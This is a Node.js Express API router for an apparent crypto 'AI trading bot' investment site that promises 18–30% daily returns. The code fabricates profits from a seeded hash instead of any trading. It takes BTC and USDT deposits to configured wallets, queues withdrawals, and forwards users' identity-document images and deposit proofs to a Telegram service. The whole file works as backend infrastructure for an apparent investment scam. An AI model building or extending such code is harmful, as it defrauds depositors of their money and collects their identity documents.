'use strict';
const crypto = require('node:crypto');
const express = require('express');
const bcrypt = require('bcryptjs');
const multer = require('multer');
const { config } = require('./config');
const { User, LedgerEntry, Deposit, Withdrawal, ChatMessage, Investment, Notification, EmailDelivery } = require('./models');
const { mongoose } = require('./db');
const {
  passwordPolicyErrors, parseMoneyToCents, publicId, normalizeIdentifier,
  safeText, requireAuth, asyncRoute, clientUser
} = require('./security');
const { withTransaction, applyBalanceDelta } = require('./services/balance');
const { getMarketPrices } = require('./services/market');
const accountEvents = require('./services/account-events');
const { subscribe, snapshot, markRead, markAllRead, committed } = require('./services/notifications');

const PLANS = Object.freeze({
  'starter-3d': { id: 'starter-3d', name: 'Xytrion Cross Market AI Bot', category: 'stocks', durationDays: 3, minDailyPct: 18, maxDailyPct: 30, minAmount: 100, maxAmount: 50000, winRate: '85%', pairs: ['10Y Treasury', 'AAPL', 'VIX'], description: 'Trades different instruments using diversified, risk-managed strategies across multiple asset classes for consistent, balanced returns.', gradient: 'from-cyan-500 to-blue-600', accent: 'cyan', icon: 'globe' },
  'momentum-5d': { id: 'momentum-5d', name: 'Stock Momentum AI Trading Algo', category: 'stocks', durationDays: 5, minDailyPct: 18, maxDailyPct: 30, minAmount: 100, maxAmount: 50000, winRate: '89%', pairs: ['AAPL', 'TSLA', 'NVDA', 'MSFT'], description: 'Advanced momentum trading bot that identifies breakout patterns and trending stocks. Focuses on high-volume stocks with strong technical signals.', gradient: 'from-emerald-500 to-teal-600', accent: 'emerald', icon: 'trending-up' },
  'volatility-7d': { id: 'volatility-7d', name: 'Volatility Surface Bot', category: 'indices', durationDays: 7, minDailyPct: 18, maxDailyPct: 30, minAmount: 50, maxAmount: 150000, winRate: '88%', pairs: ['VIX', 'VXX', 'UVXY', 'SVXY'], description: 'Advanced volatility trading bot that maps and trades the volatility surface across multiple assets. Ideal for sophisticated traders seeking alpha.', gradient: 'from-purple-500 to-violet-600', accent: 'purple', icon: 'activity' },
  'bond-7d': { id: 'bond-7d', name: 'AI Bond Yield Hunter', category: 'indices', durationDays: 7, minDailyPct: 18, maxDailyPct: 30, minAmount: 1000, maxAmount: 200000, winRate: '92%', pairs: ['10Y Treasury', '30Y Treasury', '2Y Treasury', 'Corp. Bonds'], description: 'Sophisticated fixed-income trading bot that navigates interest rate changes and yield curve movements. Perfect for institutional-grade returns.', gradient: 'from-amber-500 to-orange-500', accent: 'amber', icon: 'landmark' },
  'equities-10d': { id: 'equities-10d', name: 'Equirant Equities Trading Bot', category: 'forex', durationDays: 10, minDailyPct: 18, maxDailyPct: 30, minAmount: 150, maxAmount: 5000, winRate: '79%', pairs: ['EUR/USD', 'GBP/JPY', 'USD/CAD', 'AUD/NZD'], description: 'High-frequency scalping bot designed for quick profits from small price movements. Perfect for active traders seeking consistent daily returns.', gradient: 'from-blue-500 to-indigo-600', accent: 'blue', icon: 'bot' }
});

function sessionRegenerate(req) {
  return new Promise((resolve, reject) => req.session.regenerate((error) => error ? reject(error) : resolve()));
}
function sessionSave(req) {
  return new Promise((resolve, reject) => req.session.save((error) => error ? reject(error) : resolve()));
}
function sessionDestroy(req) {
  return new Promise((resolve, reject) => req.session.destroy((error) => error ? reject(error) : resolve()));
}

function asAsset(method) {
  const text = String(method || '').toUpperCase();
  if (text.includes('BTC') || text.includes('BITCOIN')) return 'BTC';
  if (text.includes('USDT') || text.includes('TETHER')) return 'USDT';
  throw Object.assign(new Error('Unsupported deposit asset.'), { statusCode: 400 });
}

function validImage(file) {
  if (!file || !/^image\/(png|jpe?g|gif|webp)$/i.test(file.mimetype)) return false;
  const b = file.buffer || Buffer.alloc(0);
  return b.subarray(0, 8).equals(Buffer.from([137,80,78,71,13,10,26,10])) ||
    b.subarray(0, 3).equals(Buffer.from([255,216,255])) || b.subarray(0, 3).toString() === 'GIF' ||
    (b.subarray(0, 4).toString() === 'RIFF' && b.subarray(8, 12).toString() === 'WEBP');
}

function uploadMiddleware() {
  return multer({
    storage: multer.memoryStorage(),
    limits: { fileSize: config.uploads.maxBytes, files: 2 },
    fileFilter: (_req, file, callback) => {
      if (!String(file.mimetype || '').startsWith('image/')) return callback(Object.assign(new Error('Only image uploads are accepted.'), { statusCode: 400 }));
      return callback(null, true);
    }
  });
}

function investmentJSON(inv) {
  return {
    id: inv.publicId, botId: inv.planId, botName: inv.botName, amount: inv.amountCents / 100,
    durationDays: inv.durationDays, minDailyPct: inv.minDailyPct, maxDailyPct: inv.maxDailyPct,
    startTime: new Date(inv.startTime).getTime(), status: inv.status,
    dailyProfits: (inv.dailyProfits || []).map((d) => ({ day: d.day, ratePct: d.ratePct, profit: d.profitCents / 100, date: d.date })),
    totalProfit: inv.totalProfitCents / 100, lastProcessedDay: inv.lastProcessedDay,
    completedAt: inv.completedAt ? new Date(inv.completedAt).getTime() : null, payoutCredited: inv.payoutCredited
  };
}

function seededRate(id, day, min, max) {
  const seed = `${id}:${day}`;
  let hash = 2166136261;
  for (let index = 0; index < seed.length; index += 1) {
    hash ^= seed.charCodeAt(index);
    hash = Math.imul(hash, 16777619);
  }
  const unit = ((hash >>> 0) % 10000) / 10000;
  return Math.round((min + unit * (max - min)) * 100) / 100;
}

async function processInvestmentsForUser(userId) {
  const now = Date.now();
  const active = await Investment.find({ user: userId, status: 'active' });
  for (const initial of active) {
    await withTransaction(async (session) => {
      const inv = await Investment.findOne({ _id: initial._id, status: 'active' }).session(session);
      if (!inv) return;
      const elapsedDays = Math.floor((now - new Date(inv.startTime).getTime()) / 86400000);
      const targetDay = Math.min(elapsedDays, inv.durationDays);
      for (let day = inv.lastProcessedDay + 1; day <= targetDay; day += 1) {
        const ratePct = seededRate(inv.publicId, day, inv.minDailyPct, inv.maxDailyPct);
        const profitCents = Math.round(inv.amountCents * ratePct / 100);
        inv.dailyProfits.push({ day, ratePct, profitCents, date: new Date(new Date(inv.startTime).getTime() + day * 86400000) });
        inv.totalProfitCents += profitCents;
        inv.lastProcessedDay = day;
      }
      if (elapsedDays >= inv.durationDays && !inv.payoutCredited) {
        const payout = inv.amountCents + inv.totalProfitCents;
        await applyBalanceDelta({ userId, deltaCents: payout, type: 'investment_payout', actorType: 'system', actorId: 'investment-engine', referenceType: 'investment', referenceId: inv.publicId, idempotencyKey: `investment-payout:${inv.publicId}` }, session);
        inv.status = 'completed'; inv.payoutCredited = true; inv.completedAt = new Date(new Date(inv.startTime).getTime() + inv.durationDays * 86400000);
      }
      await inv.save({ session });
    });
  }
}

function createApiRouter({ telegramService } = {}) {
  const router = express.Router();
  const upload = uploadMiddleware();
  const tg = telegramService || { notify: async () => ({ delivered: false }), notifyDeposit: async () => ({ delivered: false }), notifyWithdrawal: async () => ({ delivered: false }), notifyKyc: async () => ({ delivered: false }), notifyChat: async () => ({ delivered: false }), processUpdate: async () => {} };
  const streamsPerUser = new Map();
  let activeStreams = 0;

  router.post('/auth/register', asyncRoute(async (req, res) => {
    const username = safeText(req.body.username, 30);
    const name = safeText(req.body.name, 100);
    const email = safeText(req.body.email, 254);
    const phone = safeText(req.body.phone, 40);
    const country = safeText(req.body.country, 80);
    const errors = passwordPolicyErrors(req.body.password);
    if (!/^[A-Za-z0-9_.-]{3,30}$/.test(username)) errors.push('Username must be 3–30 characters and use only letters, numbers, dots, dashes, or underscores.');
    if (!/^\S+@\S+\.\S+$/.test(email)) errors.push('Enter a valid email address.');
    if (!name) errors.push('Full name is required.');
    if (!country) errors.push('Country is required.');
    if (errors.length) return res.status(400).json({ ok: false, error: errors[0], errors });

    const passwordHash = await bcrypt.hash(String(req.body.password), 12);
    let user;
    try {
      user = await withTransaction(async (dbSession) => {
        const [created] = await User.create([{ username, usernameNormalized: normalizeIdentifier(username), email, emailNormalized: normalizeIdentifier(email), passwordHash, name, phone, country }], { session: dbSession });
        await accountEvents.registered(created, dbSession);
        return created;
      });
    } catch (error) {
      if (error && error.code === 11000) return res.status(409).json({ ok: false, error: 'An account with that email or username already exists.' });
      throw error;
    }
    committed(user._id);
    await sessionRegenerate(req); req.session.userId = String(user._id); await sessionSave(req);
    tg.notify('registration', { user }).catch(() => {});
    return res.status(201).json({ ok: true, user: clientUser(user) });
  }));

  router.post('/auth/login', asyncRoute(async (req, res) => {
    const identifier = normalizeIdentifier(req.body.identifier || req.body.email);
    const user = await User.findOne({ $or: [{ emailNormalized: identifier }, { usernameNormalized: identifier }], status: 'active', deletedAt: null }).select('+passwordHash');
    const valid = user && await bcrypt.compare(String(req.body.password || ''), user.passwordHash);
    if (!valid) return res.status(401).json({ ok: false, error: 'Invalid email/username or password.' });
    await sessionRegenerate(req); req.session.userId = String(user._id); await sessionSave(req);
    try { await accountEvents.loggedIn(user); }
    catch (error) { await sessionDestroy(req); res.clearCookie('xytrion.sid'); throw error; }
    tg.notify('login', { user }).catch(() => {});
    return res.json({ ok: true, user: clientUser(user) });
  }));

  router.post('/auth/logout', requireAuth, asyncRoute(async (req, res) => {
    await sessionDestroy(req);
    res.clearCookie('xytrion.sid');
    return res.json({ ok: true });
  }));

  router.get('/auth/me', requireAuth, asyncRoute(async (req, res) => {
    const user = await User.findOne({ _id: req.session.userId, status: 'active', deletedAt: null });
    if (!user) return res.status(401).json({ ok: false, error: 'Session is no longer valid.' });
    return res.json({ ok: true, user: clientUser(user) });
  }));

  router.patch('/account', requireAuth, asyncRoute(async (req, res) => {
    const name = safeText(req.body.name, 100); const phone = safeText(req.body.phone, 40); const country = safeText(req.body.country, 80);
    if (!name) return res.status(400).json({ ok: false, error: 'Full name is required.' });
    const user = await User.findOneAndUpdate({ _id: req.session.userId, status: 'active' }, { $set: { name, phone, country } }, { new: true, runValidators: true });
    return res.json({ ok: true, user: clientUser(user) });
  }));

  router.post('/auth/change-password', requireAuth, asyncRoute(async (req, res) => {
    const errors = passwordPolicyErrors(req.body.newPassword);
    if (errors.length) return res.status(400).json({ ok: false, error: errors[0], errors });
    if (req.body.newPassword !== req.body.confirmPassword) return res.status(400).json({ ok: false, error: 'Password confirmation does not match.' });
    const user = await User.findById(req.session.userId).select('+passwordHash');
    if (!user || !(await bcrypt.compare(String(req.body.currentPassword || ''), user.passwordHash))) return res.status(401).json({ ok: false, error: 'Current password is incorrect.' });
    user.passwordHash = await bcrypt.hash(String(req.body.newPassword), 12); await user.save();
    await sessionRegenerate(req); req.session.userId = String(user._id); await sessionSave(req);
    return res.json({ ok: true, message: 'Password updated successfully.' });
  }));

  router.delete('/account', requireAuth, asyncRoute(async (req, res) => {
    if (String(req.body.confirmation || '') !== 'DELETE') return res.status(400).json({ ok: false, error: 'Type DELETE to confirm account deletion.' });
    const user = await User.findById(req.session.userId).select('+passwordHash');
    if (!user || !(await bcrypt.compare(String(req.body.password || ''), user.passwordHash))) return res.status(401).json({ ok: false, error: 'Password is incorrect.' });
    const suffix = String(user._id);
    await withTransaction(async (dbSession) => {
      user.status = 'deleted'; user.deletedAt = new Date(); user.name = 'Deleted User'; user.phone = ''; user.country = '';
      user.email = `deleted-${suffix}@invalid.local`; user.emailNormalized = user.email;
      user.username = `deleted-${suffix}`; user.usernameNormalized = user.username; user.passwordHash = await bcrypt.hash(crypto.randomBytes(32).toString('hex'), 12);
      await user.save({ session: dbSession });
      await ChatMessage.deleteMany({ user: user._id }).session(dbSession);
      await Notification.deleteMany({ user: user._id }).session(dbSession);
      await EmailDelivery.deleteMany({ user: user._id }).session(dbSession);
      await Withdrawal.updateMany({ user: user._id }, { $set: { destination: '[redacted]' } }).session(dbSession);
    });
    await sessionDestroy(req); res.clearCookie('xytrion.sid');
    return res.json({ ok: true, message: 'Account deleted.' });
  }));

  router.get('/config/deposit-wallets', requireAuth, (_req, res) => res.json({ ok: true, wallets: config.wallets }));
  router.get('/market/prices', asyncRoute(async (_req, res) => {
    const result = await getMarketPrices();
    return res.status(result.available ? 200 : 503).json(result);
  }));

  router.get('/notifications', requireAuth, asyncRoute(async (req, res) => res.json({ ok: true, ...await snapshot(req.session.userId) })));
  router.patch('/notifications/:id/read', requireAuth, asyncRoute(async (req, res) => {
    if (!mongoose.isValidObjectId(req.params.id)) return res.status(404).json({ ok: false, error: 'Notification not found.' });
    if (!await markRead(req.session.userId, req.params.id)) return res.status(404).json({ ok: false, error: 'Notification not found.' });
    return res.json({ ok: true });
  }));
  router.post('/notifications/read-all', requireAuth, asyncRoute(async (req, res) => res.json({ ok: true, updated: await markAllRead(req.session.userId) })));
  router.get('/notifications/stream', requireAuth, asyncRoute(async (req, res) => {
    const userId = String(req.session.userId);
    if ((streamsPerUser.get(userId) || 0) >= 5 || activeStreams >= 200) return res.status(429).json({ ok: false, error: 'Too many live notification connections. The bell will continue to refresh periodically.' });
    streamsPerUser.set(userId, (streamsPerUser.get(userId) || 0) + 1);
    activeStreams += 1;
    res.set({ 'Content-Type': 'text/event-stream; charset=utf-8', 'Cache-Control': 'no-cache, no-transform', Connection: 'keep-alive', 'X-Accel-Buffering': 'no' });
    res.flushHeaders();
    let closed = false; let checking = false; let rerun = false; let last = '';
    async function push() {
      if (closed) return;
      if (checking) { rerun = true; return; }
      checking = true;
      try {
        const sessionData = await new Promise((resolve, reject) => req.sessionStore.get(req.sessionID, (error, value) => error ? reject(error) : resolve(value)));
        const active = sessionData && String(sessionData.userId) === userId && await User.exists({ _id: userId, status: 'active', deletedAt: null });
        if (!active) { res.end(); return; }
        const data = await snapshot(userId);
        const signature = JSON.stringify(data);
        if (signature !== last) { last = signature; res.write(`event: notifications\ndata: ${signature}\n\n`); }
      } catch (_error) { if (!closed) res.write('event: refresh-error\ndata: {}\n\n'); }
      finally { checking = false; if (rerun && !closed) { rerun = false; setImmediate(() => { push().catch(() => {}); }); } }
    }
    const unsubscribe = subscribe(userId, () => { push().catch(() => {}); });
    const poll = setInterval(() => { push().catch(() => {}); }, 4000);
    const heartbeat = setInterval(() => { if (!closed) res.write(': keepalive\n\n'); }, 20000);
    res.on('close', () => {
      closed = true; unsubscribe(); clearInterval(poll); clearInterval(heartbeat);
      const remaining = (streamsPerUser.get(userId) || 1) - 1;
      if (remaining) streamsPerUser.set(userId, remaining); else streamsPerUser.delete(userId);
      activeStreams -= 1;
    });
    await push();
  }));

  router.get('/transactions', requireAuth, asyncRoute(async (req, res) => {
    const [deposits, withdrawals, ledger] = await Promise.all([
      Deposit.find({ user: req.session.userId }).sort({ createdAt: -1 }).limit(100),
      Withdrawal.find({ user: req.session.userId }).sort({ createdAt: -1 }).limit(100),
      LedgerEntry.find({ user: req.session.userId }).sort({ createdAt: -1 }).limit(100)
    ]);
    return res.json({ ok: true,
      deposits: deposits.map((d) => ({ id: d.publicId, amount: d.amountCents / 100, method: d.asset, network: d.network, walletAddress: d.address, status: d.status, date: d.createdAt })),
      withdrawals: withdrawals.map((w) => ({ id: w.publicId, amount: w.amountCents / 100, fee: w.feeCents / 100, coin: w.asset, walletAddress: w.destination, status: w.status, date: w.createdAt })),
      ledger: ledger.map((l) => ({ id: String(l._id), amount: l.amountCents / 100, balanceAfter: l.balanceAfterCents / 100, type: l.type, date: l.createdAt }))
    });
  }));

  router.post('/deposits', requireAuth, upload.single('proof'), asyncRoute(async (req, res) => {
    const amountCents = parseMoneyToCents(req.body.amount);
    const asset = asAsset(req.body.method || req.body.asset);
    if (!req.file || !validImage(req.file)) return res.status(400).json({ ok: false, error: 'Upload a valid PNG, JPEG, GIF, or WebP proof image.' });
    const wallet = config.wallets[asset];
    const { dep, user } = await withTransaction(async (dbSession) => {
      const user = await User.findOne({ _id: req.session.userId, status: 'active', deletedAt: null }).session(dbSession);
      if (!user) throw Object.assign(new Error('Session is no longer valid.'), { statusCode: 401 });
      const [dep] = await Deposit.create([{
        publicId: publicId('DEP'), user: user._id, amountCents, asset,
        network: wallet.network, address: wallet.address, sessionId: publicId('SES'),
        proof: { originalName: safeText(req.file.originalname, 150), mimeType: req.file.mimetype, size: req.file.size, sha256: crypto.createHash('sha256').update(req.file.buffer).digest('hex') }
      }], { session: dbSession });
      await accountEvents.deposited(user, dep, dbSession);
      return { dep, user };
    });
    committed(user._id);
    const delivery = await tg.notifyDeposit({ deposit: dep, user, proof: req.file }).catch((error) => ({ delivered: false, error: error.message }));
    dep.notificationDelivered = Boolean(delivery.delivered); dep.notificationError = delivery.delivered ? '' : safeText(delivery.error, 200); await dep.save();
    return res.status(201).json({ ok: true, transaction: { id: dep.publicId, amount: amountCents / 100, method: asset, network: dep.network, walletAddress: dep.address, status: dep.status, date: dep.createdAt }, notificationDelivered: dep.notificationDelivered });
  }));

  router.post('/withdrawals', requireAuth, asyncRoute(async (req, res) => {
    const amountCents = parseMoneyToCents(req.body.amount, { minCents: 5000 });
    const asset = safeText(req.body.asset || req.body.coin || req.body.method, 10).toUpperCase().replace('BITCOIN', 'BTC').replace('ETHEREUM', 'ETH');
    if (!['USDT', 'BTC', 'ETH'].includes(asset)) return res.status(400).json({ ok: false, error: 'Unsupported withdrawal asset.' });
    const destination = safeText(req.body.destination || req.body.walletAddress, 180);
    if (destination.length < 8) return res.status(400).json({ ok: false, error: 'Enter a valid destination address.' });
    const { withdrawal, user } = await withTransaction(async (dbSession) => {
      const user = await User.findOne({ _id: req.session.userId, status: 'active', deletedAt: null }).session(dbSession);
      if (!user || user.balanceCents < amountCents + 500) throw Object.assign(new Error('Insufficient balance for the withdrawal amount and $5.00 fee.'), { statusCode: 409 });
      const [withdrawal] = await Withdrawal.create([{ publicId: publicId('WDR'), user: user._id, amountCents, feeCents: 500, asset, destination, sessionId: publicId('SES') }], { session: dbSession });
      await accountEvents.withdrawn(user, withdrawal, dbSession);
      return { withdrawal, user };
    });
    committed(user._id);
    const delivery = await tg.notifyWithdrawal({ withdrawal, user }).catch((error) => ({ delivered: false, error: error.message }));
    withdrawal.notificationDelivered = Boolean(delivery.delivered); withdrawal.notificationError = delivery.delivered ? '' : safeText(delivery.error, 200); await withdrawal.save();
    return res.status(201).json({ ok: true, transaction: { id: withdrawal.publicId, amount: amountCents / 100, fee: 5, coin: asset, walletAddress: destination, status: withdrawal.status, date: withdrawal.createdAt }, notificationDelivered: withdrawal.notificationDelivered });
  }));

  router.post('/kyc', requireAuth, upload.fields([{ name: 'frontimg', maxCount: 1 }, { name: 'backimg', maxCount: 1 }]), asyncRoute(async (req, res) => {
    const front = req.files && req.files.frontimg && req.files.frontimg[0]; const back = req.files && req.files.backimg && req.files.backimg[0];
    if (!front || !validImage(front)) return res.status(400).json({ ok: false, error: 'A valid front document image is required.' });
    if (back && !validImage(back)) return res.status(400).json({ ok: false, error: 'The back document must be a valid image.' });
    const user = await User.findOneAndUpdate({ _id: req.session.userId, status: 'active' }, { $set: { kycStatus: 'under_review' } }, { new: true });
    await tg.notifyKyc({ user, data: req.body, front, back }).catch(() => {});
    return res.json({ ok: true, status: user.kycStatus });
  }));

  const sendChat = asyncRoute(async (req, res) => {
    const sessionId = safeText(req.body.sessionId, 80); const message = safeText(req.body.message, 2000);
    if (!/^[A-Za-z0-9-]{6,80}$/.test(sessionId) || !message) return res.status(400).json({ ok: false, error: 'Valid chat session and message are required.' });
    const user = await User.findById(req.session.userId);
    const saved = await ChatMessage.create({ sessionId, user: user._id, sender: 'user', text: message });
    const delivery = await tg.notifyChat({ sessionId, message, user }).catch(() => ({ delivered: false }));
    return res.status(201).json({ ok: true, delivered: Boolean(delivery.delivered), id: String(saved._id), time: saved.createdAt });
  });
  router.post('/send', requireAuth, sendChat);
  router.post('/chat/send', requireAuth, sendChat);
  router.get('/messages', requireAuth, asyncRoute(async (req, res) => {
    const sessionId = safeText(req.query.sessionId, 80);
    const messages = await ChatMessage.find({ user: req.session.userId, sessionId, sender: { $in: ['support', 'system'] } }).sort({ createdAt: 1 }).limit(200);
    return res.json(messages.map((m) => ({ id: String(m._id), text: m.text, time: m.createdAt })));
  }));
  router.post('/chat/end', requireAuth, asyncRoute(async (req, res) => {
    const sessionId = safeText(req.body.sessionId, 80);
    await ChatMessage.create({ sessionId, user: req.session.userId, sender: 'system', text: 'Chat session ended by user.' });
    return res.json({ ok: true });
  }));

  router.get('/investments', requireAuth, asyncRoute(async (req, res) => {
    await processInvestmentsForUser(req.session.userId);
    const list = await Investment.find({ user: req.session.userId }).sort({ startTime: -1 });
    return res.json({ ok: true, plans: Object.values(PLANS), investments: list.map(investmentJSON) });
  }));
  router.post('/investments', requireAuth, asyncRoute(async (req, res) => {
    const plan = PLANS[safeText(req.body.planId, 40)];
    if (!plan) return res.status(400).json({ ok: false, error: 'Invalid investment plan selected.' });
    const amountCents = parseMoneyToCents(req.body.amount, { minCents: plan.minAmount * 100, maxCents: plan.maxAmount * 100 });
    const result = await withTransaction(async (dbSession) => {
      const duplicate = await Investment.exists({ user: req.session.userId, planId: plan.id, status: 'active' }).session(dbSession);
      if (duplicate) throw Object.assign(new Error('You already have an active investment in this bot.'), { statusCode: 409 });
      const id = publicId('INV');
      await applyBalanceDelta({ userId: req.session.userId, deltaCents: -amountCents, type: 'investment_debit', actorType: 'user', actorId: req.session.userId, referenceType: 'investment', referenceId: id, idempotencyKey: `investment-debit:${id}` }, dbSession);
      const [investment] = await Investment.create([{ publicId: id, user: req.session.userId, planId: plan.id, botName: plan.name, amountCents, durationDays: plan.durationDays, minDailyPct: plan.minDailyPct, maxDailyPct: plan.maxDailyPct, startTime: new Date() }], { session: dbSession });
      await accountEvents.invested(await User.findById(req.session.userId).session(dbSession), investment, dbSession);
      return investment;
    });
    committed(req.session.userId);
    return res.status(201).json({ ok: true, investment: investmentJSON(result) });
  }));

  router.post('/telegram/webhook', asyncRoute(async (req, res) => {
    if (!config.telegram.webhookSecret || req.get('x-telegram-bot-api-secret-token') !== config.telegram.webhookSecret) return res.sendStatus(403);
    await tg.processUpdate(req.body);
    return res.json({ ok: true });
  }));

  return router;
}

module.exports = { createApiRouter, PLANS, processInvestmentsForUser, investmentJSON };
